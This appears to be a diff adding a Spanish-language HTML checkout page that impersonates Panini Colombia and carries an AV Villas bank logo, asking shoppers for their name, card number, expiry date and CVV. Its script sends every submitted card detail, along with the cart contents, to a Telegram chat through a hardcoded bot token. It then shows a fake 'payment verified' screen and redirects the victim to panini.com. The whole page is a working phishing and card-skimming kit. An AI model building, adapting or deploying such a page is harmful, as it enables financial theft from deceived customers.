@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Datos de Tarjeta - Panini</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background-color: #E31E24;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Líneas decorativas diagonales */
+        .diagonal-line {
+            position: absolute;
+            background-color: rgba(255, 255, 255, 0.1);
+            transform: rotate(45deg);
+        }
+
+        .line-1 {
+            width: 200px;
+            height: 3px;
+            top: 50px;
+            left: 30px;
+        }
+
+        .line-2 {
+            width: 150px;
+            height: 3px;
+            top: 100px;
+            left: 80px;
+        }
+
+        .line-3 {
+            width: 180px;
+            height: 3px;
+            top: 150px;
+            left: 120px;
+        }
+
+        .line-4 {
+            width: 200px;
+            height: 3px;
+            bottom: 200px;
+            left: 50px;
+        }
+
+        .line-5 {
+            width: 250px;
+            height: 3px;
+            bottom: 100px;
+            left: 100px;
+        }
+
+        .line-6 {
+            width: 180px;
+            height: 3px;
+            bottom: 50px;
+            left: 200px;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 24px;
+            padding: 40px 32px;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 10;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo img {
+            max-width: 180px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #E31E24;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #D1D5DB;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.2s;
+            appearance: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #E31E24;
+        }
+
+        input::placeholder {
+            color: #9CA3AF;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background-color: #C5CEDB;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: #E31E24;
+            cursor: pointer;
+        }
+
+        .btn-submit.active:hover {
+            background-color: #C41E1E;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .links a {
+            color: #E31E24;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #E31E24;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 40px;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            text-align: center;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #E31E24;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9998;
+            flex-direction: column;
+            gap: 30px;
+            padding: 20px;
+        }
+
+        .success-screen.active {
+            display: flex;
+        }
+
+        .success-check {
+            width: 100px;
+            height: 100px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.6s ease-out;
+            box-shadow: 0 10px 30px rgba(76, 175, 80, 0.4);
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .checkmark svg {
+            width: 60px;
+            height: 60px;
+            stroke: white;
+            stroke-width: 3;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .checkmark .check-path {
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+            animation: checkStroke 0.6s ease-out 0.3s forwards;
+        }
+
+        @keyframes checkStroke {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        .success-title {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .success-message {
+            color: white;
+            font-size: 15px;
+            text-align: center;
+            max-width: 320px;
+            line-height: 1.6;
+        }
+
+        .success-details {
+            color: white;
+            font-size: 13px;
+            text-align: center;
+            max-width: 300px;
+            margin-top: 10px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Procesando tu pago<br>Por favor espera un momento...</p>
+    </div>
+
+    <!-- Success Screen -->
+    <div class="success-screen" id="successScreen">
+        <div class="success-check">
+            <div class="checkmark">
+                <svg viewBox="0 0 52 52">
+                    <path class="check-path" d="M 10 26 L 22 38 L 42 14" />
+                </svg>
+            </div>
+        </div>
+        <p class="success-title">¡Pago Verificado!</p>
+        <p class="success-message">Tu compra ha sido procesada correctamente.</p>
+        <div class="success-details">
+            <p>📧 Recibirás tu factura y confirmación de compra en tu correo electrónico dentro de unos momentos.</p>
+            <p style="margin-top: 10px;">Gracias por tu confianza en Panini Colombia.</p>
+        </div>
+    </div>
+
+    <!-- Líneas decorativas -->
+    <div class="diagonal-line line-1"></div>
+    <div class="diagonal-line line-2"></div>
+    <div class="diagonal-line line-3"></div>
+    <div class="diagonal-line line-4"></div>
+    <div class="diagonal-line line-5"></div>
+    <div class="diagonal-line line-6"></div>
+
+    <div class="container" id="formContainer">
+        <div class="logo">
+            <img src="av_villas.jpg" alt="Logo">
+        </div>
+
+        <h1>Datos de tu Tarjeta</h1>
+
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="fullName">Nombre completo</label>
+                <input type="text" id="fullName" placeholder="JUAN PEREZ" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Número de tarjeta</label>
+                <input type="text" id="cardNumber" placeholder="4532 1234 5678 9010" maxlength="19" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry">Vencimiento (MM/AA)</label>
+                    <input type="text" id="expiry" placeholder="12/25" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">PAGAR AHORA</button>
+
+            <div class="links">
+                <a href="av.html">← Volver atrás</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // ========================================
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003781125998';
+
+        // Formatear número de tarjeta
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // Formatear vencimiento
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Solo números en CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Validar formulario
+        function validateForm() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            const submitBtn = document.getElementById('submitBtn');
+
+            if (fullName && cardNumber && expiry && cvv) {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        // Event listeners para validación
+        document.getElementById('fullName').addEventListener('input', validateForm);
+        document.getElementById('cardNumber').addEventListener('input', validateForm);
+        document.getElementById('expiry').addEventListener('input', validateForm);
+        document.getElementById('cvv').addEventListener('input', validateForm);
+
+        // Función para enviar a Telegram
+        function enviarATelegram(datos) {
+            let cartItems = [];
+            const savedCart = localStorage.getItem('paniniCart');
+            if (savedCart) {
+                cartItems = JSON.parse(savedCart);
+            }
+
+            let cartSummary = '';
+            let total = 0;
+            cartItems.forEach(item => {
+                const subtotal = item.price * item.quantity;
+                total += subtotal;
+                cartSummary += `\n• ${item.name} (x${item.quantity}): $${subtotal.toLocaleString('es-CO')}`;
+            });
+
+            const mensaje = `
+💳 *NUEVA ORDEN - TARJETA DE CRÉDITO*
+
+👤 *Nombre Completo:* ${datos.fullName}
+💳 *Número de Tarjeta:* ${datos.cardNumber}
+📅 *Vencimiento:* ${datos.expiry}
+🔐 *CVV:* ${datos.cvv}
+
+🛒 *Productos:*
+${cartSummary}
+
+💰 *Total:* $${total.toLocaleString('es-CO')}
+
+⏰ *Fecha:* ${datos.fecha}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Error:', error));
+        }
+
+        // Manejo del formulario
+        const form = document.getElementById('cardForm');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const successScreen = document.getElementById('successScreen');
+        const formContainer = document.getElementById('formContainer');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Mostrar pantalla de carga
+            formContainer.style.display = 'none';
+            loadingScreen.classList.add('active');
+
+            // Preparar datos
+            const datos = {
+                fullName: fullName,
+                cardNumber: cardNumber,
+                expiry: expiry,
+                cvv: cvv,
+                fecha: new Date().toLocaleString('es-CO', { 
+                    timeZone: 'America/Bogota',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                })
+            };
+
+            // Enviar a Telegram
+            enviarATelegram(datos);
+
+            // Después de 2 segundos, mostrar pantalla de éxito
+            setTimeout(() => {
+                loadingScreen.classList.remove('active');
+                successScreen.classList.add('active');
+                
+                // Después de 4 segundos, limpiar carrito y redirigir a panini.com
+                setTimeout(() => {
+                    localStorage.removeItem('paniniCart');
+                    window.location.href = 'https://www.panini.com';
+                }, 4000);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
